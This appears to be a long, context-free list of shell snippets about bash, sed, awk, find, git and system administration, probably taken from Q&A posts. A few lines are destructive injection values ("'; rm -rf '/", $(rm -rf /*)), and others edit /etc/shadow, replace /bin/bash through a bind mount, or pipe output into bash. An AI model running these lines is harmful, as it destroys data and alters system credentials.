ssh-keygen -C "somecomment@somehostname"
curl -s http://google.com
curl -s http://google.com > temp.html
> /some/file
| less
curl -sS --get {someURL}
-bash: type: cdb: not found
echo "${$VAR}"
$( )
echo 1
curl | head
man bash
grep foo bigfile|head -n 10 > result &
< <(commands)
rm .git/builds/current
grep -f
foo.txt >> bar.txt
file foo.txt
#include <foo/bar.h>
#include "bar.h"
N - 1
wc -l
head -n $(($(cat lipsum.log | wc -l) - 1)) lipsum.log
set nocount on
which command-name
type command
type -a
whence -v
grep "$1;$2" my.config
echo "$1;$2
: command not foundtable;pattern;read;write;stuff
$line=$(grep ...)
cat <(head tmp)
<(head tmp)
ssh -n
sh -c
export [-fn] [name[=word]] ...
export -p
set -a
( ... )
my_cmd -a -b ... c
a -additional "$@"
'\u@\h ~ '
ksh -x ./testdebug.sh
typeset -ft function-name
Test        XXX
-e '/Test *XXX/p'
/Test *XXX/
-e '0,/Test *XXX/d'
/Test *XXX/
Test    XXX
Test    XXX
play dependencies
play.bat dependencies
$ ^previous^replacement^
myCommand moreParameters
myCommand -s 12 moreParameters
myCommand -s12 moreParamaters 
myCommand -s moreParameters   
myCommand moreParameters
sed -ne '/\"/!p' theinput > theproduct
grep -v
rm -rf ~/.rvm
java -jar yourApp.jar
-dFirstPage=${i} -dLastPage=${i}
chmod 755 batch_gs.sh
image_1.png ... image_15.png
image_25.png ... image_39.png
config.active_record.logger = nil
2>&1 | tee
export tee='2>&1 | tee'
Variable assignment '2>&1' invalid (no "=")
pwd > ~/.lastdir
cd $(cat ~/.lastdir)
cd path_to_folder
findphp 'function x'
function x
amp: command not found
set -s
set -f
set -o noglob
shopt -op noglob
unset IFS
sort <<<"${array[*]}"
sort <<<"${array[*]}
unset IFS
uniq -z
-d ''
[[ $i < $pivot ]]
((i < pivot))
((i < pivot))
set -f
set +f
unset IFS
printf '%s\n' "${a_in[@]}" | sort
printf '%s\n'
readarray -t a_out
IFS=$'\n' read -d '' -r -a a_out
-d ''
sort -k1,1n
readarray -d '' -t a_out < <(printf '%s\0' "${a_in[@]}" | sort -z)
sorted=($(echo ${array[@]} | tr " " "\n" | sort))
[[ $* =~ [$wa] ]]
exit 1
set -f
sort -n
set --
for x
set "${array[@]}"
printf '%s\n' "$@"
mapfile -t array
subprocess.Popen(['/home/<user>/.mono/bin/mono'], stdout=subprocess.PIPE)
:command not found
bash myscript.sh
#! /usr/bin/perl
mysql -se "select file_column_name from table where id=20;" >file.txt
-k 70
--kill-after= 70
timeout [options] duration command [arg]...
-k duration
-k duration
kill -0
find . -exec
grep -lr
xargs sed -i
find . -exec
for file in *.php ; do mv "$file" "_$file" ; done
man bash
bar baz
"--foo=bar baz"
foo=bar baz
--foo=bar baz
cat -v
help echo
my file
f1="'; rm -rf '/"
set -eu
if [$loaded -eq $true]
if [ "$loaded" -eq true ]
if [ $pid = $tmp ]
shopt -s nullglob
ls -<some options>
ls -S
ls -lS
ls -lhS
du -sm
stat -c %s
du -sb /
ls -l
ncdu [path]
du -h -d 1 | sort -n
du -hsx 2>/dev/null * | sort -hr | less
:> /server/logs/access_log
:> filename
help :
constant bit rate
apt-get install lame
man lame
su - <user>  -c "bash -c  'cd $DIR ;<service name>'"
su <user> -c "bash -c '<path to service> $1'"
sudo update-rc.d <my_scrpit> defaults
root# ./etc/init.d/my_scrpit start
sudo cp /etc/init.d/skeleton /etc/init.d/mynewservice
--chuid username:group
start-stop-daemon --start --quiet --pidfile $PIDFILE --exec $DAEMON --test > /dev/null \
start-stop-daemon --start --quiet --chuid someuser:somegroup --pidfile $PIDFILE --exec $DAEMON --test > /dev/null \
update-rc.d mynewservice defaults 99 && service mynewservice start
time make $@
man -s 1 time
man -s 1 make
\( ! -name . \)
0 0
xargs -0
ls -1
find -maxdepth 1 -iname "*.txt"
STRING : REGEXP
man expr
$ BumpVersion.sh manifest.json 0.15.2.34
"version":    "0.2.0.1",
"version":    "0.2.1.0",
Case Notes:
Case notes:
while read
-type f
-maxdepth 1
diff fileA fileB > fileA.diff
export LDFLAGS += -march=armv7 -mcpu=arm1176jzf-s -mcpu=cortex-a8
sed 's/[.].*$//'
| bash
while ps -p ${PID[*]}; do sleep 1; done ; script2
grep -R
curl -d @filename http://targetaddress.com
^.*(.)\1+$   that ended with same letters..
^.*[$1]$  that ended with 'literal string'
( ) { }
set bind-tty-special-chars off
python equivalent of DBD::CSV
telnet localhost 80
ls -lrt
var0 = $var0 + 1
$( ... )
echo $PATH
ls -l /Library/Ruby/Gems/1.8/gems/rspec-2.6.0/lib
which rspec
help case
man bash
sudo make install
sudo node
grep -e .html$ -e .css$
cat $e | while read numcodigo; do
./<scripts_name> codes.txt
epoch=$( IFS="/:"; set -- $d; date -d "$1 $2 $3 $4:$5:$6" +%s )
I have:
I want:
Instead of:
sed -rn "s/([^0-9]*)([0-9\.]+)([^0-9]*.*)/\2/ p"
[[ ... ]]
egrep -o PATTERN file
grep -c
let us
echo "book'" |sed -n '/book[\x27]/p'
cat testfile
sed -i 's|"http://www\.fubar\.com"|URL_FUBAR|g' testfile
cat testfile
your_script | tee file
text2csv.py yourinput.txt
?, +, {, |, (, and )
\?, \+, \{, \|, \(, and \)
man bash
sleep 5
crontab -e
... manage.py delete_unverified_files
command 2>file
./myscript -i 192.168.1.1 -p 1985
./myscript -p 1985 -i 192.168.1.1
syscall 1
-maxdepth 1
-mindepth 1
mkdir -p
curl -f
du -sb
while [$k -ne $SDATE]
while [ $k -ne $SDATE ]
sudo killall perl
workon: command not found
venv-run.sh my_virtualenv /path/to/script.py
inotifywait -e CREATE
while inotifywait -e ...
F=${RES#?*CREATE }
F="${RES#?*CREATE }"
while ... done
while IFS= read -r file
set -x
man set
man -x
script xyz
script -a xyz
Script started on ...
Script done on ...
echo "please get here"
sub_1, sub_2, ... sub_10
total number of archive_* directories/10
distribute.py -c10 -p sub *
--filter="-! */"
-! */
PID 1909
gedit --new-window &
man gedit
pkill gvfsd-trash
pkill gvfsd-trash
wc -l
\[ ... \]
('64bit', 'ELF')
fold -w5
cut -c "$2"- <<<"$1" | sed
sed 's/...../&\n/g'
<< >>
script.cmd "D:\Test Area" TTFILE YTL MSZSH1 ch1
D:\Test Area
D:\Test Area
SHOW SLAVE STATUS\G
Last_Error: ...
awk {'print $3'} myfile | grep -f - myotherfile
. ~/.profile
print $0
print $1 "[" $2 "]" $3
Feb 23 13:55
Feb 23 14:00
set -u
declare -a arr
"${arr[0]}" "${arr[1]}" …
GNU bash, version 3.2.25(1)-release (x86_64-redhat-linux-gnu)
declare -p
>= 4.4
set -u
set -u
-o /dev/null
-n 1
-P 8
0 .. ${#string}-1
printf -v var
[h e l l o 1 2 3 ]
read -a
echo ${array[@]}
s t r i n g
echo ${array[2]}
read -a
-not -name output.txt
find ...
javac -classpath
{word1, username, blah blahblah}
git status --short && (git status --short | xargs -Istr test -z str)
git status --short | tee >(xargs -Istr test -z str)
OUT=$(git status --short) && echo "${OUT}" && test -z "${OUT}"
xargs -0
$ find /path/to/base/dir -type f -name '*.properties' | xargs sed -ie '/^#/d'
file path
wp-cli db export
find . -exec rename 1.2.3.4 5.6.7.8 {} \;
rename "$(cat filter.sed)" *
set -o errexit
apt-get install markdown
less FILENAME.md
alias mdless='...'
_mdless() {...};
if [ -n "$1" ] ; then
if [ -f "$1" ] ; then
cat arg1 arg2 | groff
<(echo ".TH $1 7
Dr.Beco Markdown")
<(pandoc -t man $1)
| groff -K utf8 -t -T utf8 -man 2>/dev/null
-K utf8
-T utf8
| less
awk '!_[$1]++'
#!/bin/bash -x
bash -c
php -l $file
php -l
GNU parallel
GNU parallel
find . -name '*.xml'
find . -name '*.xml'
-type f
find . -name '*.xml'
ls | parallel -j2 script.sh {}
rvm notes
\[ ... \]
( mkdir work ...
( cd product ...
BUILDTYPE == build
( ... ) < /dev/null
bash ./script.sh
cleartool setview
cleartool setview $myview
echo $$
echo $$
<span style="float:right">Last Update: 9/30/2011 3:16:31 AM</span><p>
man date
grep -Po '(?<={)[^:]+(?=:)'
mysql -f -p < 2010-12-01.sql
INSERT IGNORE
service --status-all | grep "firestarter"
service --status-all
service --status-all
| sort | awk '{ if ($0) { if (TEMP != $1) { print "Original: " $0 } else { print "Duplicate:" $0 } TEMP = $1 } }'
| tac | awk '{ if ($0) { if (TEMP != $1) { print "Original: " $0 } else { print "Duplicate:" $0 } TEMP = $1 } else { print "" } }' | tac
New Text Document.txt
NF >= 3
readlink -f
cat ${FILE}
cat "js.txt"
grep -o '(.*)'
-type f
history -r <your_file>
set -e
do srv
do echo srv
curl -X POST 'https://api.twilio.com/2010-04-01/Accounts/GUID/SMS/Messages.xml' -d 'From=DIDfrom' -d 'To=DIDto' -d 'Body="'$smsbody'" -u SECGUID
smsbody="$(echo $HOSTNAME$ $SERVICEDESC$ in $SERVICESTATE$\: $SERVICEOUTPUT$ | awk '{print substr($0,0,150)}')"
nc -l 5000
man 1 logname
sudo userID=$(id -u $(logname))
userID=$(id -u $1)
bash -x
touch complete
touch failed
git status -s
git status
db2 SELECT CURRENT_DATE FROM SYSIBM.SYSDUMMY1 WITH UR > /tmp/output
echo y | command
yum install <package_to_install> -y
grep -F
sh -c
man curl
SET PATH=c:\path\to\javah;%PATH%
export PATH=/path/to/javah:$PATH
if [ -d  $ExBase ]
if [ -d ]
printf %q
set -x
#!/bin/bash -x
/usr/local/etc/rc.d/tomcat55 start
/usr/local/etc/rc.d/tomcat55 start
shopt -s expand_aliases
fileDir = /home/grammin/testFiles/program1/important/
ls fileDir/FILE1
ls $fileDir/FILE1
ln -s /this/is/a/very/long/filesystem/path pth
ls pth/FILE1
alias foo='
find . -exec ${BASH_ALIASES[foo]} {} \;
f := a\ b
f := 'a b'
mornin' all
'morning'\'' all'
"morning' all"
x\ y
x y
git log
read rev
read rev
read rev
git rev-list --reverse HEAD
./sendEvent.sh "CRIT" "EVENT" "Test Event"
Tue Oct  4 20:31:29 CDT 2011 - msend exited with error 27 | Original arguments: CRIT EVENT Test Event | Command: /home/patrol/Impact/bin/msend -q -l /home/patrol/Impact -j /home/patrol/Impact/tmp/Introscope -n linuxtest -a EVENT -m "Test Event" -r CRITICAL
/home/patrol/Impact/bin/msend -q -l /home/patrol/Impact -j /home/patrol/Impact/tmp/Introscope -n linuxtest -a EVENT -m "Test Event" -r CRITICAL
./sendEvent.sh "CRIT" "EVENT" "TestEvent"
cmd="$cmd -m $msg"
cmd="$cmd -m \"$msg\""
bash -x
line 0: [: missing
set -x
set +x
strace -f -o /tmp/foo ./program
#!/bin/bash -x
cp /bin/bash /bin/real.bash
mount --make-shared /
unshare --mount bash
mount --make-slave /
mount -B /bin/wrapper.bash /bin/bash
ls -li /bin/dir /bin/ls
ps axo pid,comm,pcpu| awk '/ffmpeg/ {if ($3 <= 15.0 && $3 >= 10.0) print "kill -9 "$1}' | bash
ps axo pid,comm,pcpu| awk '/ffmpeg/ {if ($3 <= 15.0 && $3 >= 10.0) print "kill -9 "$"; ./rebootScript.py"}'
sudo chmod +x ./ffmpegCheck.sh
mv ffmpegCheck.sh /usr/local/bin/ffmpegcheck
crontab -l
sudo crontab -l
sudo crontab -e
*/3 * * * * /usr/local/bin/ffmpegcheck # ffmpeg check
expr "$stringZ" : '[0-9a-fA-F]\{32\}\|[0-9a-fA-F]\{40\}'
help source
chmod a+x scriptname.sh
AccountRef,telno, rental_file1,rental_file2,gprs_file1,gprs_file2
-t ,
cmd --help
getopt -q
{ ... }
#!/usr/bin/sed -f
chmod +x
man find(1)
-type f
head -n -2
grep foo `grep bar * -l` | awk -F':' '{print $1}' | sort | uniq
 emacs ` whatever_was_in_my_output ` 
emacs `grep foo `grep bar * -l` | awk -F':' '{print $1}' | sort | uniq `
formail -c
git reset
fatal: This operation must be run in a work tree
git status
git config core.bare
git init --bare
echo "
print "echo " $2
echo data
sed -i "s/.*look.me.*/look.me=$host_var/"
do-things arg1 arg2 | progress-meter "Doing things...";
Doing things...
do-things arg1 arg2
[ OK ]
progress-meter "Doing things..." "do-things arg1 arg2";
progress-meter "Doing things..." <(do-things arg1 arg2);
progress_meter "Do things..." "do-things arg1 arg2"
kill -SIGTERM $PPID
trap "kill -SIGTERM $PPID" EXIT
tail -f process.stdin | ( my_process > process.stdout ; kill -SIGTERM $PPID )
nano .bash_logout
export | grep -i edit
sudo update-alternatives –config editor
export EDITOR="nano"
echo 'EDITOR="nano"' >> ~/.bashrc
tail -f
{ ... }
echo not found
rm "$STDLOG" &>/dev/null
java XMLBeautifier directory
java XMLBeautifier
./myscript --p 1984 --n someName
./myscript --p 1985
help getopts
bash newdata.sh DirectoryName
< <
< <
<( ... )
ps -ef
ps aux
comm -3
mv Data/NewDataCopy/* Data/
rmdir Data/NewDataCopy
FILE *
find . -type d -exec touch {}/file$RANDOM \;
screen -dm -S "backup"
screen -ls
screen -dm -S "backup"
-c /dev/null
man gnome-terminal
sed -r
man sed
-maxdepth 1
find . -path "*/arch/*/*" -prune -o -path "*/arch/*.cpp" -print
echo $PATH
-G Enable colorized output.
for foo in list
md5sum "$i"
ls -d *
ls -d $PWD/*/
ls -d -- $PWD/*/
ls -d */
ls -d -- */
find `pwd` -type d -maxdepth 1 -name [^.]\*
find . -name '*.php' | xargs chmod 755
-exec /bin/echo
awk '{print $4}' test.txt
sort foo > foo
cat testfile | perl scriptname.pl
ps aux | grep guest
bash -c "while true; do make -s foo.ps; sleep 2; done"
kill %3
ps j
kill -- -1234
/^Statistics |/
/^Statistics |/!
ssh remotehost path/to/script
expect eof
folder A-bin
folder B-bin
echo "hi" "there"
hi there
echo "hi""there"
"#!/usr/bin/expect -d"
exec $@
find . -name "*IDNumber*" -exec ls '{}' ';' -print
man bc
fs -ls
hadoop fs -ls /path/to/files
hadoop fs -ls /path/to/files | grep 'part' | awk '{print $8}'
hadoop fs -ls /path/to/files | grep 'part' | awk '{print $8}' | head -n47
$ip{$old} = $new
man pgrep
sudo apt-get install mysql
erl -eval
sort -R
Directory not empty
Illegal option
rm -r
echo $?
echo $?
hash -d python
hash -r
apt-get install python-pip
pip install --use-mirrors MySQL-python
echo $PATH
which pip
echo $PATH
which pip
foo |& bar
foo 2>&1 | bar
default_run_options[:shell] = '/bin/bash'
# deb
# deb
df -H
g++ -g -std=c++0x signal_child_watch_example.cc -o signal_child_watch_example `pkg-config --libs --cflags giomm-2.4`
sudo apt-get install libglibmm-2.4-dev
trap ". ${HOME}/.profile" SIGUSR1
pkill -SIGUSR1 bash
 screen -X at \# stuff "whatever command\n"
find /cygdrive/x/Clients -name '*.210'
set -vx
MULTIPLE_FILES=$(echo /tmp/{dir1,dir2}/*.file)
find ... -print0 | xargs -0 ...
 foo -o >(other command) 
foo -o >(tee output.txt) | other command
foo -o <(cat)
sleep 0.5
| while read element; do ... done
wc -l
split -l 75 auth.log auth.log.
auth.log.aa, auth.log.ab, ...
wc -l
CHUNKS  may  be:
man tr
<a href="...">
<a href="http://link1">
<a href="http://link2">
which git
chmod 755
find | xargs
wc -l rank.txt
uniq -c
up arrow
Ctrl-c Ctrl-.
In [5]:
source ~/.bashrc
cd $htdocs
cd htdocs
cd foo
cd foo
`command param ...`
$(command param ...)
grep -P "^[\s]*[0-9A-Za-z-]+.?[\s]*$" test.txt
cat $1 | egrep "^\s*\w+\s*$" > output.txt
$ > myprogram filename.txt
cat filename
> filename
awk 'NF==1' filename
sudo /etc/rc.local
sudo chmod 755 /path/of/the/file.sh
sh /path/of/the/file.sh
sudo chmod 755 /etc/rc.local
sudo /etc/init.d/rc.local start
sleep 3
ls -ltrd foo* | tail -1 | awk '{print $8}'
sh -c ...
man <command>
ls -a
for i in *; do mv "$i" "${i,,}"; done
$0 ~ /regex/
ls -c1
ls -c1 | tail -1
man ls
$1 ... $n
eval $CMD
grep -o
for i in $@; do
if [ -z ${i##*.c} ]; then
debconf-show packagename
echo "get samba-common/encrypt_passwords" | debconf-communicate
echo "set samba-common/encrypt_passwords false" | debconf-communicate
Terminating script execution..
parent clean site-deploy
ls *.[jJ][pP][eE][gG]
shopt -s extglob
shopt -s nocaseglob
tee -a ~/Documents/Homebrew\ Updates.txt
cat - ~/Documents/Homebrew\ Updates.txt > ~/Documents/Homebrew\ Updates.txt
sed -i
rm temp file
1 
apt-get upgrade
export PATH="blablabla"
apt-cache showpkg wine1.2
"amount.sh: 11: [[: not found"
 read 
 < /dev/tty 
LANG= ifconfig
grep -I
$ sh file.sh one two
ls -la
find . -type f -executable
void something(float a, int b, char c);
float int char
awk '{print $2 $3 $4 $5 ....}'
sed 's/[^ ]* *//'
echo Hello world!
echo Hello world!
echo $BASH_VERSION
"1 2"
test -v
[ -z "$name" ]
[ -z "${name+isset}" ]
find ... |xargs awk '...'
mkdir -p /directories/.... && touch /directories/file
perl script.pl -i.bak fileglob
perl script.pl -i.bak File*MINvac.pdb
BULDTYPE=$(echo $BULDTYPE | tr -d '\r');
Edit->EOL Conversion->Unix
... | vim -
cp /etc/skel/.inputrc ~/.inputrc
/tmp/spaced dir
/tmp/spaced dir
find -regex
find -exec
fmt -999
set -o
man bash
[[ "${VAR:?}" ]]
a != b
xprop -id $activeWindow WM_NAME
ls -i
sed -i ...
source ./script.sh
. ./script.sh
. cd.sh
shopt -s extglob
"Do you like to eat 0?"
bc -l <<< "e($n*l($x))"
echo "e($n*l($x))" | bc -l
1 .. 10 .. 100
001 ..010 .. 100
#!/bin/env python
chmod a+x post-commit
Warning: post-commit hook failed (exit code 255) with no output
unzip $1 "$main"
echo -e ... \c
python -c <stuff>
python -c
perl -p
echo "some_text = 'x.y.z'" | cut -d\' -f2
cat file | grep -o x\.y\.z
some_text = 'x.y.z'
some_text =
{print $2}
M-x R
sh: ./test.rb: Permission denied
M    ODULEPATH
#!env ruby
kill $pid 2>/dev/null
gm "This is my commit message"
git commit -am "This is my commit message" && git push
gm My_Message
gm This is my message
git commit -am "This" && git push
gm "my commit message"
gm "this is my message"
git acp "commit messages here!"
-Djava.library.path=${env_var:HOME}/.m2/repository/natives/dist/lib -ea
mvn test
mvn test -DargLine="-Djava.library.path=/Users/rob/.m2/repository/natives/dist/lib -ea"
<argLine>-Djava.library.path=/Users/rob/.m2/repository/natives/dist/lib -ea</argLine>
if [ -r "$i" ]
cp -vr $i $p
cp -r "$i" "$p"
bash --version
echo "$user1: " >> /etc/shadow
chown -R $user1:$user1 /home/$homename
echo "$user1: " >> /etc/gshadow
\( \|$\)
unzip somefile.zip "*/blah.txt"
md5sum $LOCAL_FILE
sh -xv
bash -xv
man bash
Pathname Expansion
die "some msg"
echo "some msg" && exit 1
die 127 "Syntax error"
result=$result" "$item1
awk 'NF==1'
sed '/[^ ] +[^ ]/d'
git pull
for ... in ...
if make; then ...; else ...; fi
man date
watch - execute a program periodically, showing output fullscreen
watch -n 600 my_script.sh
man --pager='less -p "\s*Here Documents"' bash
sleep 10; echo "hello"
:set ff=unix
aptitude install bash-completion
make Event.o
$(root-config --cflags)
make -f WriteTree.make Event.o
CFLAGS=$(root-config --cflags)
root-config --cflags
.SUFFIXES = .C .o
.SUFFIXES: .C .o
test<numbers or letters>.<number>.out
$command .= " &2>1; echo $?";
echo $?
echo $?
exec($command, $output, $retcode);
$retcode = intval(array_pop($output));
echo $?
test [option] #without any operand
test "a non-empty string"
while read a; do echo $a; done
shopt -s extglob
. script.sh
source script.sh
set -o vi
history | grep blah
curl -sB
read file
[^] ]\+
ls -l
use Config;
perl -V:scriptdirexp
xxd -p /usr/bin/find2perl
info "(bash)Shell Parameter Expansion"
SHELL=/bin/bash -O expand_aliases
Unix timestamp
man date
grep -F reservedList ....
man grep
command-name 2>&1
command-name >file_for_stdout 2>&1
command 2>> error 1>> output
command 2> error 1> output
command 2> error 1> output
command 2> error > output
12 in number
awk 'script.....' count=$count
{print $0}
echo $iv
echo "$iv"
RS=" "
RS="[ \n]"
-bash: /usr/local/bin/heroku: /usr/local/bin/ruby: bad interpreter: No such file or directory
which ruby
updatedb && locate ruby
grep -iH heroku /*
-bash: /usr/local/bin/heroku: /usr/local/bin/ruby: bad interpreter: No such file or directory
/usr/local/bin/ruby: bad interpreter: No such file or directory
ln -s
ln -s /usr/bin/ruby
... 2>&1
php -a
vmstat 1
cd /some/path
rails s --port=3002
cd /other/path
rails s --port=3000
if [ -x filename ]
stat -c %a /path/to/a/file
bay=$(prog -some flags)
info bash
name () compound-command [ redirections ]
function name [()] compound-command [ redirections ]
while read
while read f
while read -d $'\n' f
ls -l
source test.sh -test
-bash: [test: command not found
set -vx
man bash
info bash
if [ -z "$pid" ]
foo.sh TEST_3
foo.sh TEST_2B/TEST_3
find -name TEST_3
find -path *ST_2/TEST3
git log --decorate
git branch
git rev-parse
ps -e
grep -v
egrep -v '[^a-zA-Z]'
search for '<Connector port="8443"'
<Connector port="8443"
blaunch -u <hostfile> <cmd>
python script.py &> logfile.txt
nc -l -p 8011
python script.py &> nc 127.0.0.1 8011
python script.py > nc 127.0.0.1 8011
nc 127.0.0.1 8011 < python script.py
nc -l -p 1234
nc -l 1234
other command...
cat yourFile|xargs -n8
xargs -n8 -a yourfile
[ $choice="Y" ]
[ "$choice" = Y ]
[ -f $1 ]
$ inotifywait -m -r --exclude [REGEX HERE] ~/js
while read
--exclude '\.[^j][^s]'
inotifywait --help
grep -- --b test
man bash
man bash
man bash
man bash
man bash
<< \EOF
<< EOF
<< EOF
<< 'EOF'
close failed in file object destructor: sys.excepthook is missing lost sys.stderr
rm -rf
spawn ssh
pactl list
" ...,/^$[${spaceChar}${tabChar}]*\$/p"
spaceChar=" "
textextext text
TMPDIR = $(mktemp -d)
-v version
$(NF - 1)
man bash
| xargs echo
man xargs
find ... -print0
grep ... --null
sed 's/\\/\\\\/g'
dir /b /s /a *.txt | tr "\\" "/" | xargs ...
(cd $SOMEPATH/input && $SOMEPATH/bin/bin.exe input.cfg)
help disown
set :o vi
ESC, k, k,...
grep -v
ls *.v[#]
Defaults env_keep += "HOME PYTHONPATH"
Defaults !env_reset
Defaults env_keep += "PYTHONPATH"
Defaults env_reset
export PYTHONPATH=/your/custom/path
Defaults env_keep += "ENV1 ENV2 ..."
Defaults !env_reset
sed -e 's/^.*\(name=[^ ,]*\).*$/\1/'
name="quoted string"
name=string\ with\ escaped\ spaces
awk '{print($3)}'
sed "s/$curLine/$nextLine/" </etc/network/interfaces>/etc/network/interfaces.new
$( )
[[ ]]
if [[ "$IP" == *10.130.10.* || "$IP" == *10.130.10.* ]]; then
ls -la /opt
du -f
… uname -a
… hostname -f
… cp /proc/cpuinfo /tmp/this-machine
chmod +x airport.sh
ifconfig en1 | egrep -o "([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}"
egrep -o
00 00 00 03 29
NR=40 to NR<=63
-f -
cut -b2- | awk '{ if ($1 < 18) print "E" $0 }'
print $1 " " $2
sudo ./script.sh
sudo -H script.sh
echo $HOME
perl -e 'print ((getpwuid($>))[7])'
echo foo\;bar
{ }
<? echo 'hello world'; ?>
extprogram -arg1 1 -arg2 2 ...
exit 1
if [ $# -ne 2 ];
ls -al
ls -l
printf '%s\0' *.fas
sort -zV
sort -V
bash -c 'echo $PPID'
ssh target foo
sshpass -f passwordfile ssh target foo
find ...
$ ./mycommand LINENUMBER FILENAME
find ... -print0
xargs -0
man pdffonts
pdffonts --help
-l 5
set -o vi
if [ some test ]; then some_command; fi
while true
[ 1 ]
[ 0 ]
syntax error: unexpected end of file
ps ax|grep -v grep|grep -q tracker_stream
ps ax|grep -v grep|grep tracker_stream
cat stream_should_be_running.txt
+ $'\r'
set -vx
vim -b
$( cat ... )
$(cat ...)
set -vx
bash: (nohup ./Script.sh 10 1&): No such file or directory
(nohup ./Script.sh 10 1&)
(nohup ./Script.sh 10 1&)
./Script.sh 10 1
#!/usr/bin/env sh
#!/usr/bin/env sh
expr $1 % 3 = 0
$1 % 3
alias c='workon django-canada'
workon django-canada
fab test
gc this is a test message
git commit -m "this is a test message"
gm "msg"
kill -0
kill pid
kill -9 pid
kill <pid>
jobs -l
kill -15 -1 16000
expr:non-integer argument
echo "\n\n$proto Header"
TCP HEADER
UDP HEADER
ICMP HEADER
echo -e
[[ ]]
[ ]
if [ "$i" -eq 32 ]
for i in "${task[@]}"
echo -n
echo -n
while ps -p $A_PID >/dev/null; do...
man stat
man sort
man find
man bc
man tr
password = getpass.getpass('password: ')
$ ./python_script < input.txt
$(rm -rf /*)
printf '%q'
s/(.*)\n(.*)/\2 \1/
tail -n 10 <logfile>
tail -10 logfile | tac
tail -r
string map
shuf -n1 -i 10000000-20000000
cat -n |
sed -i
[  == "test" ]
[ "$str" == "test" ]
ln -s /home/$user /var/www/vhosts/$domain
man bash
--noprofile --norc
--rcfile file
man bash
gcam 'something'
gcam 'new commit'
Paths with -a does not make sense
nc -l $1
End Of Text
) is used in the old-style command substitution, e.g. foo=
ls -l
mkdir -p
find /var/log -name \*$arg\* -print
$(basename $f )
diff -Naur /path/to/one /path/to/two
->  | <-
pids=( ... )
$( ... )
u << ...
list.inject(0) { .. }
mkisofs -V Photos -r /home/vivek/photos | cdrecord -v dev=/dev/dvdrw -
cd -
nc -l -p 12345 | tar xvzf -
[ \( -L $F \)  ]
file $f | grep 'broken symbolic link'
sysadminctl -addUser
ls --color=auto
ls -G
ls file1 file2 -l
ls -l file1 file2
svn info
svn ls -R | grep -v "\."
svn ls
cp -arf ./SourceFolder ./DestFolder
cp -r ./dist/* ./out
ack PROJECT_HOME
execute cancer 9
execute promoter 9
: command not found
tr -d '\n' <temp
awk -v RS="pattern"
foo bar.txt
baz qux.txt
exit $status
grep -w
validate "$x"
echo $LIST | xargs -n1 echo | grep $VALUE
[[ ]]
foo barbaz
" $haystack "
" $needle "
if (haystack.contains(needle1)) { run1() } elif (haystack.contains(needle2)) { run2() } else { run3() }
case " $haystack " in (*" $needle1 "*) run1;; (*" $needle2 "*) run2;; (*) run3;; esac
(*) false
if (haystack.contains(needle1)) { run1(); }; if (haystack.contains(needle2)) { run2(); }
else echo "${x} is NOT in the list";
Window 0 - user1@localmachine
Window 1 - user1@localmachine
Window 2 - user1@localmachine SSH to user2@remotemachine
something [username]
$(curl -F "api_key=$apikey" -F "format=json" -F "md5=$thismd5" -F... );
sed -e 's;^.*/;;'
sed -r 's#^(([^/]*/)*)(.*)#\3#'
cut -f1 file1 file2 | sort | uniq -d
'database' => 'cake_test_db'
sh -c 'cmd &'
git pull
git checkout -f
printf "%04d" "9"
(( ... ))
(( 10#$var ))
(( 10#08 ))
(( var++ ))
(( var-- ))
var=$(( 10#var + 1 ))
var=$(( 10#var - 1 ))
floating point
sed -i -f tftp.sed /var/lib/tftpboot/ltsp/i386/pxelinux.cfg/default
telnet 192.168.1.45 27065
perl -e require "sys/ioctl.ph"; ioctl(...);
ioctl(open("/dev/console"), 30, 1);
echo "$@"
anArray=(a b c d)
man exit
Parameters : Values
File 3
File 1
hexdump -C
write $offset "ff c0 d3 ba be"
xxd -r -p text
shopt -s lastpipe
155,000,000 / 158,609,739 * 32,767
find . -name '*$1*' -print | xargs mv {} $2{}
SUBSTITUE TEXT
<div class=.entry.>
<div class=.entry.>
SUBSTITUTE TEXT
Android eee pad transformer
chmod +x ./test.sh
PATH TO THE SCRIPT
ls -l
ls -l@ *script_path*
xattred -d com.apple.quarantine *script_path*
~/dev/git-completion.bash &
man dup2
dup2 (STDOUT_FILENO, newsock);
cat file | less
history 1
ls -l
${parm2} $parm2
echo zzzabczzzz | grep -o '.abc..'
sudo crontab -e
ps aux | grep abc.sh
sudo bash /etc/m/start.sh &
rename 's/\.less//' *.css
sh -c
ksh -c
cat filename | grep "[0-9]"
grep -P "^[0-9\ \t]*$"
conf  $1  $2  $3  var#
echo $LINE
< "$f"
cat $f
man test
if [ 0 ]
if [ false ]
if [ no ]
if [ "" ]
$( )
syntax error near unexpected token
tr -d '?."!:,();' < manywords | tr 'A-Z' 'a-z' | tr ' ' '\n'
1     3.28044
2     1.17147
$ awk -f transpose.awk file > transposedFile
scriptname.pl mydata.dat
grep { length }
df -h
df -k
df -k $INSTALL_TARGET_DIRECTORY
df -k "$PWD"
while (<$file>)
use Module;
use CPAN;
ls *
f = (9/5)c+32
sleep 30
cd /data/local/tmp
ps -ef | grep sleep
sush -c cd /data/local/tmp && nohup sleep 30 > /dev/null &
sleep 30
sleep 30
${file% 1.mp3}
If I care 1.mp3
If I care
${file% 1.mp3}.mp3
rm $file
echo Removing file $file
python manage.py shell
echo sadsad asddsa ;' dsasa  | ./sth.sh | xargs -l rm -f
exit 0
exit 1
for nr in "$gen"
for nr in $gen
while [ $# == 0 ];
[ $# -ne 0 ]
while [ $# == 0 ]
while [ $# != 0 ]
while [ $# -ne 0 ]
while [ $# -eq 0 ]
$x == 0
$x != 0
$x eq 0
$x ne 0
while [ $# == 0 ]
$# != 0
$# > 0
while read options
while read options
set -- arg1 arg2 ...
if [[ "$(f1)" == "whatever" ]]
man test
hose localhost 22 --in sh -c "cat"
hose localhost 22 --in sh -c "read var; echo $var"
GIT_WORK_TREE=/var/www/www.example.org git checkout -f
git checkout -f
cd /var/www/www.yoursite.com && git init
git remote add origin git@testserverip:/path/to/repo.git
git fetch origin
git merge
git merge -m 'Overwriting live server' -s recursive -X theirs origin/active-branch-on-live-server
trap cmd-list 0
trap cmd-list 0 2
ssh localhost parent.sh
nohup myInScript.sh >some.log 2>&1 </dev/null &
at now -f my_script.sh
perl script.pl 2>&1 >errorTestnormal.out | tee -a errorTestnormal.out > errorTest.out
if(!empty($filePlease)) { sleep(10); }
Here Strings
this is a really long command
this is a really long command
($sort ...)
Ptr f(path)
cmp -s test.py test.py~
man cmp
cmp ... 2>/dev/null
shell=$(dirname $(readlink -f $0))"/wpshell.php"
readlink -f
$(readlink -f $0)
dirname /path/to/foo.sh
$(dirname $(readlink -f $0))
